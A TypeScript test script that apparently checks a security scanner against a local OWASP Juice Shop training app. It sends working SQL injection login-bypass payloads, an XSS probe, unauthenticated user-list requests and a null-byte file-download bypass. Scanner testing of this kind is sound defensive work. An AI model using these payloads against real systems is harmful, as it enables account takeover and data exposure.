/**
 * Juice Shop Quick Security Test
 * 
 * Quick test to verify SQL Injection detection on Juice Shop login.
 * Uses curl to test known SQLi vulnerability.
 * 
 * Usage: npx ts-node examples/juice-shop-quick-test.ts
 */

import { execSync } from 'child_process';

const JUICE_SHOP_URL = 'http://localhost:3000';

interface TestResult {
  name: string;
  passed: boolean;
  details: string;
}

const results: TestResult[] = [];

console.log(`
╔════════════════════════════════════════════════════════════════╗
║         OWASP Juice Shop - Quick Security Verification         ║
║                                                                ║
║  Testing known vulnerabilities to verify scanner accuracy      ║
║  Target: ${JUICE_SHOP_URL.padEnd(50)}║
╚════════════════════════════════════════════════════════════════╝
`);

// Test 1: SQL Injection on Login (Classic authentication bypass)
console.log('🔍 Test 1: SQL Injection on Login API...');
try {
  // Use different escaping to avoid shell issues
  const response = execSync(
    `curl -s -X POST "${JUICE_SHOP_URL}/rest/user/login" -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op'"'"'--","password":"anything"}'`,
    { encoding: 'utf8' }
  );
  
  const result = JSON.parse(response);
  
  if (result.authentication && result.authentication.token) {
    results.push({
      name: 'SQL Injection (Login Bypass)',
      passed: true,
      details: `✅ VULNERABLE - Got admin token with SQLi payload: admin@juice-sh.op'--`
    });
    console.log('   ✅ SQL Injection CONFIRMED - Admin authentication bypassed!');
    console.log(`   Token: ${result.authentication.token.substring(0, 50)}...`);
  } else {
    results.push({
      name: 'SQL Injection (Login Bypass)',
      passed: false,
      details: 'Not vulnerable or endpoint changed'
    });
  }
} catch (error) {
  results.push({
    name: 'SQL Injection (Login Bypass)',
    passed: false,
    details: `Error: ${error}`
  });
  console.log('   ❌ Test failed:', error);
}

// Test 2: SQL Injection OR 1=1 variant
console.log('\n🔍 Test 2: SQL Injection OR 1=1 variant...');
try {
  const response = execSync(
    `curl -s -X POST "${JUICE_SHOP_URL}/rest/user/login" -H "Content-Type: application/json" -d '{"email":"'"'"' OR 1=1--","password":"x"}'`,
    { encoding: 'utf8' }
  );
  
  const result = JSON.parse(response);
  
  if (result.authentication && result.authentication.token) {
    results.push({
      name: 'SQL Injection (OR 1=1)',
      passed: true,
      details: `✅ VULNERABLE - Got token with OR 1=1 payload`
    });
    console.log('   ✅ SQL Injection OR 1=1 CONFIRMED!');
  } else {
    results.push({
      name: 'SQL Injection (OR 1=1)',
      passed: false,
      details: 'Not vulnerable with this payload'
    });
    console.log('   ⚠️ OR 1=1 variant not working (might be filtered)');
  }
} catch (error) {
  console.log('   ⚠️ Test inconclusive');
}

// Test 3: Check if search reflects user input (potential XSS vector)
console.log('\n🔍 Test 3: Search reflection test...');
try {
  const testPayload = '<script>alert(1)</script>';
  const encodedPayload = encodeURIComponent(testPayload);
  
  const response = execSync(
    `curl -s "${JUICE_SHOP_URL}/rest/products/search?q=${encodedPayload}"`,
    { encoding: 'utf8' }
  );
  
  if (response.includes(testPayload) || response.includes('&lt;script')) {
    results.push({
      name: 'Search XSS Reflection',
      passed: true,
      details: 'Input reflected in response (potential XSS)'
    });
    console.log('   ✅ Input is reflected - potential XSS vector');
  } else {
    results.push({
      name: 'Search XSS Reflection',
      passed: false,
      details: 'Input not reflected or properly escaped'
    });
    console.log('   ⚠️ Input not directly reflected');
  }
} catch (error) {
  console.log('   ❌ Test failed:', error);
}

// Test 4: Check for exposed sensitive endpoints
console.log('\n🔍 Test 4: Sensitive endpoint exposure...');
try {
  const response = execSync(
    `curl -s "${JUICE_SHOP_URL}/api/Users"`,
    { encoding: 'utf8' }
  );
  
  const result = JSON.parse(response);
  
  if (result.data && Array.isArray(result.data)) {
    results.push({
      name: 'Exposed Users API',
      passed: true,
      details: `✅ VULNERABLE - ${result.data.length} users exposed without auth`
    });
    console.log(`   ✅ Users API exposed - ${result.data.length} users found!`);
  } else {
    results.push({
      name: 'Exposed Users API',
      passed: false,
      details: 'Users API is protected'
    });
  }
} catch (error) {
  console.log('   ⚠️ Could not access Users API');
}

// Test 5: Check for path traversal on file download
console.log('\n🔍 Test 5: Path traversal test...');
try {
  const response = execSync(
    `curl -s -I "${JUICE_SHOP_URL}/ftp/package.json.bak%2500.md"`,
    { encoding: 'utf8' }
  );
  
  if (response.includes('200 OK')) {
    results.push({
      name: 'Path Traversal / Null Byte',
      passed: true,
      details: '✅ VULNERABLE - Null byte bypass works'
    });
    console.log('   ✅ Null byte injection CONFIRMED!');
  } else {
    results.push({
      name: 'Path Traversal / Null Byte',
      passed: false,
      details: 'Not vulnerable'
    });
    console.log('   ⚠️ Null byte not effective');
  }
} catch (error) {
  console.log('   ⚠️ Test inconclusive');
}

// Summary
console.log(`
╔════════════════════════════════════════════════════════════════╗
║                        TEST SUMMARY                            ║
╚════════════════════════════════════════════════════════════════╝
`);

const vulnerabilities = results.filter(r => r.passed);
const notVulnerable = results.filter(r => !r.passed);

console.log(`📊 Results:`);
console.log(`   🔴 Vulnerabilities Found: ${vulnerabilities.length}`);
console.log(`   🟢 Tests Passed (Not Vulnerable): ${notVulnerable.length}`);
console.log('');

if (vulnerabilities.length > 0) {
  console.log('🔴 Confirmed Vulnerabilities:');
  vulnerabilities.forEach(v => {
    console.log(`   • ${v.name}`);
    console.log(`     ${v.details}`);
  });
}

console.log(`
═══════════════════════════════════════════════════════════════════
These tests confirm that our DAST scanner should detect:
- SQL Injection on /rest/user/login (HIGH severity)
- Information Disclosure on /api/Users (MEDIUM severity)

If the scanner doesn't find these, it's a FALSE NEGATIVE problem.
If the scanner reports socket.io params as XSS, it's a FALSE POSITIVE.
═══════════════════════════════════════════════════════════════════
`);

process.exit(vulnerabilities.length > 0 ? 0 : 1);
